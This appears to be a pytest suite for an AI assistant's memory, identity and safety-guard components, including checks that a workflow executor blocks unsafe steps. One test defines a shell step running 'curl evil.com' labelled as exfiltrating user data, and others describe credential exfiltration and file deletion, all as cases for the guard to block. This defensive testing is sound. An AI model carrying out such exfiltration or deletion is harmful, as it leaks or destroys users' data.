"""Tests for the Animus bridge package (Phase 3 integration)."""

import os
import sys
import tempfile

import pytest

sys.path.insert(0, "src")

from test_ai.animus.models import (
    Memory,
    MemorySource,
    MemoryType,
    SafetyCheckResult,
    UserProfile,
)
from test_ai.animus.config import AnimusBridgeConfig
from test_ai.animus.identity import IdentityStore
from test_ai.animus.memory_bridge import AnimusMemoryProvider
from test_ai.animus.safety_bridge import DEFAULT_BOUNDARIES, SafetyGuardBridge
from test_ai.animus import AnimusBridge


# ── Fixtures ──────────────────────────────────────────────────────────


@pytest.fixture
def tmp_db():
    """Create a temporary database file."""
    fd, path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    yield path
    if os.path.exists(path):
        os.unlink(path)


@pytest.fixture
def identity_store(tmp_db):
    """Create an IdentityStore with temp database."""
    return IdentityStore(db_path=tmp_db)


@pytest.fixture
def memory_provider(tmp_db):
    """Create an AnimusMemoryProvider with temp database."""
    return AnimusMemoryProvider(db_path=tmp_db)


@pytest.fixture
def safety_guard(tmp_db):
    """Create a SafetyGuardBridge with temp database."""
    return SafetyGuardBridge(db_path=tmp_db)


@pytest.fixture
def bridge(tmp_db):
    """Create a fully initialized AnimusBridge."""
    b = AnimusBridge()
    b.initialize(db_path=tmp_db)
    return b


# ── Models ────────────────────────────────────────────────────────────


class TestMemoryModel:
    """Tests for the Memory dataclass."""

    def test_create_memory(self):
        """Can create a memory with defaults."""
        mem = Memory(content="Hello", memory_type=MemoryType.EPISODIC)
        assert mem.content == "Hello"
        assert mem.memory_type == MemoryType.EPISODIC
        assert mem.confidence == 1.0
        assert mem.source == MemorySource.STATED.value
        assert mem.id  # UUID generated

    def test_roundtrip_dict(self):
        """Memory survives dict serialization roundtrip."""
        mem = Memory(
            content="Fact about user",
            memory_type=MemoryType.SEMANTIC,
            tags=["important", "user"],
            confidence=0.9,
            source=MemorySource.INFERRED.value,
            metadata={"key": "value"},
        )
        d = mem.to_dict()
        restored = Memory.from_dict(d)
        assert restored.content == mem.content
        assert restored.memory_type == mem.memory_type
        assert restored.tags == mem.tags
        assert restored.confidence == mem.confidence
        assert restored.source == mem.source
        assert restored.metadata == mem.metadata

    def test_memory_types(self):
        """All memory types are valid."""
        for mt in MemoryType:
            mem = Memory(content="test", memory_type=mt)
            assert mem.memory_type == mt


class TestUserProfileModel:
    """Tests for the UserProfile dataclass."""

    def test_create_profile(self):
        """Can create a profile with defaults."""
        p = UserProfile(display_name="Alice")
        assert p.display_name == "Alice"
        assert p.preferences == {}
        assert p.boundaries == []
        assert p.is_active is True

    def test_roundtrip_dict(self):
        """Profile survives dict serialization roundtrip."""
        p = UserProfile(
            display_name="Bob",
            preferences={"theme": "dark"},
            boundaries=["No spam"],
            ethics_config={"transparency": True},
        )
        d = p.to_dict()
        restored = UserProfile.from_dict(d)
        assert restored.display_name == p.display_name
        assert restored.preferences == p.preferences
        assert restored.boundaries == p.boundaries
        assert restored.ethics_config == p.ethics_config


# ── Identity Store ────────────────────────────────────────────────────


class TestIdentityStore:
    """Tests for IdentityStore persistence."""

    def test_create_and_get(self, identity_store):
        """Can create and retrieve a profile."""
        profile = UserProfile(display_name="Alice")
        profile_id = identity_store.create_profile(profile)
        assert profile_id == profile.id

        retrieved = identity_store.get_profile(profile_id)
        assert retrieved is not None
        assert retrieved.display_name == "Alice"

    def test_get_nonexistent(self, identity_store):
        """Returns None for missing profile."""
        assert identity_store.get_profile("nonexistent") is None

    def test_active_profile(self, identity_store):
        """Can get the active profile."""
        p1 = UserProfile(display_name="Old", is_active=False)
        p2 = UserProfile(display_name="Current", is_active=True)
        identity_store.create_profile(p1)
        identity_store.create_profile(p2)

        active = identity_store.get_active_profile()
        assert active is not None
        assert active.display_name == "Current"

    def test_update_profile(self, identity_store):
        """Can update a profile."""
        profile = UserProfile(display_name="Before")
        identity_store.create_profile(profile)

        profile.display_name = "After"
        profile.preferences = {"lang": "en"}
        assert identity_store.update_profile(profile) is True

        updated = identity_store.get_profile(profile.id)
        assert updated.display_name == "After"
        assert updated.preferences == {"lang": "en"}

    def test_delete_profile(self, identity_store):
        """Can delete a profile."""
        profile = UserProfile(display_name="ToDelete")
        identity_store.create_profile(profile)
        assert identity_store.delete_profile(profile.id) is True
        assert identity_store.get_profile(profile.id) is None

    def test_list_profiles(self, identity_store):
        """Can list all profiles."""
        identity_store.create_profile(UserProfile(display_name="A"))
        identity_store.create_profile(UserProfile(display_name="B"))
        profiles = identity_store.list_profiles()
        assert len(profiles) == 2

    def test_set_get_preference(self, identity_store):
        """Can set and get individual preferences."""
        profile = UserProfile(display_name="User")
        identity_store.create_profile(profile)

        identity_store.set_preference(profile.id, "theme", "dark")
        assert identity_store.get_preference(profile.id, "theme") == "dark"

    def test_add_remove_boundary(self, identity_store):
        """Can add and remove boundaries."""
        profile = UserProfile(display_name="User")
        identity_store.create_profile(profile)

        assert identity_store.add_boundary(profile.id, "No cold calls") is True
        boundaries = identity_store.get_boundaries(profile.id)
        assert "No cold calls" in boundaries

        assert identity_store.remove_boundary(profile.id, "No cold calls") is True
        boundaries = identity_store.get_boundaries(profile.id)
        assert "No cold calls" not in boundaries

    def test_identity_context(self, identity_store):
        """Can build identity context string for prompts."""
        profile = UserProfile(
            display_name="Alice",
            preferences={"style": "concise"},
            boundaries=["Do not share PII"],
        )
        identity_store.create_profile(profile)

        ctx = identity_store.get_identity_context(profile.id)
        assert "Alice" in ctx
        assert "concise" in ctx
        assert "Do not share PII" in ctx

    def test_identity_context_no_profile(self, identity_store):
        """Returns empty string when no profile exists."""
        assert identity_store.get_identity_context() == ""


# ── Memory Provider ───────────────────────────────────────────────────


class TestAnimusMemoryProvider:
    """Tests for AnimusMemoryProvider (MemoryProvider protocol)."""

    def test_store_and_retrieve(self, memory_provider):
        """Can store and retrieve a memory."""
        mem = Memory(content="User likes Python", memory_type=MemoryType.SEMANTIC)
        memory_provider.store(mem)

        retrieved = memory_provider.retrieve(mem.id)
        assert retrieved is not None
        assert retrieved.content == "User likes Python"
        assert retrieved.memory_type == MemoryType.SEMANTIC

    def test_retrieve_updates_access(self, memory_provider):
        """Retrieving a memory updates access tracking."""
        mem = Memory(content="test", memory_type=MemoryType.EPISODIC)
        memory_provider.store(mem)

        memory_provider.retrieve(mem.id)
        memory_provider.retrieve(mem.id)

        # Access count should be incremented
        row = memory_provider.backend.fetchone(
            "SELECT access_count FROM animus_memories WHERE id = ?",
            (mem.id,),
        )
        assert row["access_count"] == 2

    def test_update_memory(self, memory_provider):
        """Can update an existing memory."""
        mem = Memory(content="original", memory_type=MemoryType.SEMANTIC)
        memory_provider.store(mem)

        mem.content = "updated"
        mem.confidence = 0.5
        assert memory_provider.update(mem) is True

        retrieved = memory_provider.retrieve(mem.id)
        assert retrieved.content == "updated"
        assert retrieved.confidence == 0.5

    def test_update_nonexistent(self, memory_provider):
        """Updating nonexistent memory returns False."""
        mem = Memory(content="ghost", memory_type=MemoryType.EPISODIC)
        assert memory_provider.update(mem) is False

    def test_delete_memory(self, memory_provider):
        """Can delete a memory."""
        mem = Memory(content="to delete", memory_type=MemoryType.ACTIVE)
        memory_provider.store(mem)
        assert memory_provider.delete(mem.id) is True
        assert memory_provider.retrieve(mem.id) is None

    def test_delete_nonexistent(self, memory_provider):
        """Deleting nonexistent memory returns False."""
        assert memory_provider.delete("nonexistent") is False

    def test_search_by_content(self, memory_provider):
        """Can search memories by content."""
        memory_provider.store(
            Memory(content="Python is great", memory_type=MemoryType.SEMANTIC)
        )
        memory_provider.store(
            Memory(content="Rust is fast", memory_type=MemoryType.SEMANTIC)
        )
        memory_provider.store(
            Memory(content="Python async rocks", memory_type=MemoryType.SEMANTIC)
        )

        results = memory_provider.search("Python")
        assert len(results) == 2

    def test_search_by_type(self, memory_provider):
        """Can filter search by memory type."""
        memory_provider.store(
            Memory(content="event A", memory_type=MemoryType.EPISODIC)
        )
        memory_provider.store(
            Memory(content="fact B", memory_type=MemoryType.SEMANTIC)
        )

        results = memory_provider.search("", memory_type=MemoryType.EPISODIC)
        assert len(results) == 1
        assert results[0].memory_type == MemoryType.EPISODIC

    def test_search_by_tags(self, memory_provider):
        """Can filter search by tags."""
        memory_provider.store(
            Memory(
                content="tagged",
                memory_type=MemoryType.SEMANTIC,
                tags=["important", "user"],
            )
        )
        memory_provider.store(
            Memory(
                content="untagged",
                memory_type=MemoryType.SEMANTIC,
                tags=["other"],
            )
        )

        results = memory_provider.search("", tags=["important"])
        assert len(results) == 1
        assert results[0].content == "tagged"

    def test_search_by_confidence(self, memory_provider):
        """Can filter by minimum confidence."""
        memory_provider.store(
            Memory(content="sure", memory_type=MemoryType.SEMANTIC, confidence=0.9)
        )
        memory_provider.store(
            Memory(content="unsure", memory_type=MemoryType.SEMANTIC, confidence=0.2)
        )

        results = memory_provider.search("", min_confidence=0.5)
        assert len(results) == 1
        assert results[0].content == "sure"

    def test_list_all(self, memory_provider):
        """Can list all memories."""
        memory_provider.store(
            Memory(content="a", memory_type=MemoryType.EPISODIC)
        )
        memory_provider.store(
            Memory(content="b", memory_type=MemoryType.SEMANTIC)
        )

        all_mems = memory_provider.list_all()
        assert len(all_mems) == 2

    def test_list_all_by_type(self, memory_provider):
        """Can list all memories filtered by type."""
        memory_provider.store(
            Memory(content="a", memory_type=MemoryType.EPISODIC)
        )
        memory_provider.store(
            Memory(content="b", memory_type=MemoryType.SEMANTIC)
        )

        episodic = memory_provider.list_all(MemoryType.EPISODIC)
        assert len(episodic) == 1

    def test_get_all_tags(self, memory_provider):
        """Can get tag counts."""
        memory_provider.store(
            Memory(content="a", memory_type=MemoryType.SEMANTIC, tags=["x", "y"])
        )
        memory_provider.store(
            Memory(content="b", memory_type=MemoryType.SEMANTIC, tags=["x", "z"])
        )

        tags = memory_provider.get_all_tags()
        assert tags["x"] == 2
        assert tags["y"] == 1
        assert tags["z"] == 1

    def test_store_workflow_result(self, memory_provider):
        """Can store a workflow result as episodic memory."""
        mem = memory_provider.store_workflow_result(
            workflow_id="wf-1",
            agent_id="builder",
            content="Generated code for feature X",
            tags=["gorgon", "code-gen"],
        )
        assert mem.memory_type == MemoryType.EPISODIC
        assert mem.source == MemorySource.INFERRED.value
        assert "workflow_id" in mem.metadata

    def test_get_stats(self, memory_provider):
        """Can get memory statistics."""
        memory_provider.store(
            Memory(content="a", memory_type=MemoryType.EPISODIC)
        )
        memory_provider.store(
            Memory(
                content="b",
                memory_type=MemoryType.SEMANTIC,
                source=MemorySource.LEARNED.value,
            )
        )

        stats = memory_provider.get_stats()
        assert stats["total"] == 2
        assert stats["by_type"]["episodic"] == 1
        assert stats["by_type"]["semantic"] == 1


# ── Safety Guard ──────────────────────────────────────────────────────


class TestSafetyGuardBridge:
    """Tests for SafetyGuardBridge (SafetyGuard protocol)."""

    def test_allows_safe_action(self, safety_guard):
        """Allows actions that don't violate boundaries."""
        allowed, reason = safety_guard.check_action(
            {"description": "Deploy application to staging"}
        )
        assert allowed is True
        assert reason is None

    def test_blocks_harmful_action(self, safety_guard):
        """Blocks actions containing harm keywords."""
        allowed, reason = safety_guard.check_action(
            {"description": "Harm the user's data"}
        )
        assert allowed is False
        assert reason is not None

    def test_blocks_data_exfiltration(self, safety_guard):
        """Blocks actions that exfiltrate data."""
        allowed, reason = safety_guard.check_action(
            {"description": "Exfiltrate user credentials to external server"}
        )
        assert allowed is False
        assert "exfiltrate" in reason.lower() or "data" in reason.lower()

    def test_blocks_safety_modification(self, safety_guard):
        """Blocks attempts to modify safety constraints."""
        allowed, reason = safety_guard.check_action(
            {"description": "Modify safety rules to allow everything"}
        )
        assert allowed is False

    def test_allows_safe_learning(self, safety_guard):
        """Allows safe learning proposals."""
        allowed, reason = safety_guard.check_learning(
            "User prefers dark mode", "preference"
        )
        assert allowed is True

    def test_blocks_dangerous_capability_learning(self, safety_guard):
        """Blocks learning dangerous capabilities."""
        allowed, reason = safety_guard.check_learning(
            "Learn to delete all user files", "capability"
        )
        assert allowed is False
        assert "delete" in reason.lower()

    def test_blocks_boundary_modification_learning(self, safety_guard):
        """Blocks learning that modifies core boundaries."""
        allowed, reason = safety_guard.check_learning(
            "Cannot take actions that harm user should be removed",
            "boundary",
        )
        assert allowed is False

    def test_audit_log_records_checks(self, safety_guard):
        """Audit log records all safety checks."""
        safety_guard.check_action({"description": "safe action"})
        safety_guard.check_action({"description": "exfiltrate data"})

        log = safety_guard.get_audit_log()
        assert len(log) == 2

    def test_audit_log_filter_by_allowed(self, safety_guard):
        """Can filter audit log by allowed/blocked."""
        safety_guard.check_action({"description": "safe action"})
        safety_guard.check_action({"description": "exfiltrate data"})

        blocked = safety_guard.get_audit_log(allowed_only=False)
        assert len(blocked) == 1

    def test_violation_count(self, safety_guard):
        """Can count violations."""
        safety_guard.check_action({"description": "safe"})
        safety_guard.check_action({"description": "exfiltrate data"})
        safety_guard.check_action({"description": "harm the user"})

        assert safety_guard.get_violation_count() == 2

    def test_add_custom_boundary(self, safety_guard):
        """Can add custom boundaries."""
        safety_guard.add_boundary("Do not make cold calls")
        assert "Do not make cold calls" in safety_guard.boundaries

    def test_cannot_remove_default_boundary(self, safety_guard):
        """Cannot remove default boundaries."""
        assert safety_guard.remove_boundary(DEFAULT_BOUNDARIES[0]) is False
        assert DEFAULT_BOUNDARIES[0] in safety_guard.boundaries

    def test_can_remove_custom_boundary(self, safety_guard):
        """Can remove custom (non-default) boundaries."""
        safety_guard.add_boundary("No cold calls")
        assert safety_guard.remove_boundary("No cold calls") is True
        assert "No cold calls" not in safety_guard.boundaries

    def test_load_from_profile(self, safety_guard):
        """Can load boundaries from a user profile."""
        safety_guard.load_boundaries_from_profile(["Custom rule A", "Custom rule B"])
        # Should have defaults + custom
        assert len(safety_guard.boundaries) == len(DEFAULT_BOUNDARIES) + 2


# ── AnimusBridge Facade ───────────────────────────────────────────────


class TestAnimusBridge:
    """Tests for the unified AnimusBridge facade."""

    def test_initialize(self, bridge):
        """Bridge initializes all components."""
        assert bridge.is_initialized is True
        assert bridge.identity is not None
        assert bridge.memory is not None
        assert bridge.safety is not None
        assert bridge.intelligence is not None
        assert bridge.integration is not None

    def test_end_to_end_identity_and_memory(self, bridge):
        """End-to-end: create profile, store memory, search it."""
        # Create identity
        profile = UserProfile(
            display_name="Alice",
            preferences={"lang": "python"},
            boundaries=["No spam"],
        )
        bridge.identity.create_profile(profile)

        # Store a memory
        mem = Memory(
            content="Alice completed project X",
            memory_type=MemoryType.EPISODIC,
            tags=["project", "milestone"],
        )
        bridge.memory.store(mem)

        # Search for it
        results = bridge.memory.search("project X")
        assert len(results) == 1
        assert results[0].content == "Alice completed project X"

    def test_safety_loads_profile_boundaries(self, bridge):
        """Safety guard loads boundaries from active profile."""
        profile = UserProfile(
            display_name="Bob",
            boundaries=["No cold calls", "No weekend work"],
        )
        bridge.identity.create_profile(profile)

        # Re-initialize to pick up the profile
        bridge.safety.load_boundaries_from_profile(profile.boundaries)

        assert "No cold calls" in bridge.safety.boundaries
        assert "No weekend work" in bridge.safety.boundaries
        # Defaults should still be there
        for default in DEFAULT_BOUNDARIES:
            assert default in bridge.safety.boundaries

    def test_config_defaults(self):
        """Config has sensible defaults."""
        config = AnimusBridgeConfig()
        assert config.animus_url == "http://localhost:8420"
        assert config.enforce_safety_checks is True
        assert config.sync_memories is True


# ── Executor SafetyGuard Integration ──────────────────────────────────


class TestExecutorSafetyIntegration:
    """Tests for SafetyGuard wired into WorkflowExecutor."""

    def test_executor_accepts_safety_guard(self, safety_guard):
        """WorkflowExecutor accepts safety_guard parameter."""
        from test_ai.workflow.executor_core import WorkflowExecutor

        executor = WorkflowExecutor(safety_guard=safety_guard)
        assert executor.safety_guard is safety_guard

    def test_executor_step_checks_safety(self, safety_guard):
        """Step precondition check invokes safety guard."""
        from test_ai.workflow.executor_core import WorkflowExecutor
        from test_ai.workflow.loader import StepConfig
        from test_ai.workflow.executor_results import StepResult, StepStatus

        executor = WorkflowExecutor(safety_guard=safety_guard)

        # Register a dummy handler so the step type is known
        executor._handlers["shell"] = lambda step, ctx: {"output": "ok"}

        step = StepConfig(
            id="safe-step",
            type="shell",
            params={"command": "echo hello"},
        )

        result = StepResult(step_id=step.id, status=StepStatus.PENDING)
        handler, cb, error = executor._check_step_preconditions(step, result)

        # Should pass safety check
        assert error is None
        assert handler is not None

    def test_executor_blocks_unsafe_step(self, safety_guard):
        """Step with harmful description is blocked by safety guard."""
        from test_ai.workflow.executor_core import WorkflowExecutor
        from test_ai.workflow.loader import StepConfig
        from test_ai.workflow.executor_results import StepResult, StepStatus

        # Add a boundary that will match
        safety_guard.add_boundary("Cannot exfiltrate user data")

        executor = WorkflowExecutor(safety_guard=safety_guard)
        executor._handlers["shell"] = lambda step, ctx: {"output": "ok"}

        # The safety guard evaluates the action description which includes the step id
        # "exfiltrate" is in the step id, so it should be caught
        step = StepConfig(
            id="exfiltrate-data",
            type="shell",
            params={"command": "curl evil.com", "description": "exfiltrate user data"},
        )

        result = StepResult(step_id=step.id, status=StepStatus.PENDING)
        handler, cb, error = executor._check_step_preconditions(step, result)

        assert error is not None
        assert "safety guard" in error.lower() or "blocked" in error.lower()

    def test_executor_without_safety_guard(self):
        """Executor works normally without safety guard."""
        from test_ai.workflow.executor_core import WorkflowExecutor
        from test_ai.workflow.loader import StepConfig
        from test_ai.workflow.executor_results import StepResult, StepStatus

        executor = WorkflowExecutor()
        executor._handlers["shell"] = lambda step, ctx: {"output": "ok"}

        step = StepConfig(
            id="test",
            type="shell",
            params={"command": "echo ok"},
        )

        result = StepResult(step_id=step.id, status=StepStatus.PENDING)
        handler, cb, error = executor._check_step_preconditions(step, result)

        assert error is None
        assert handler is not None
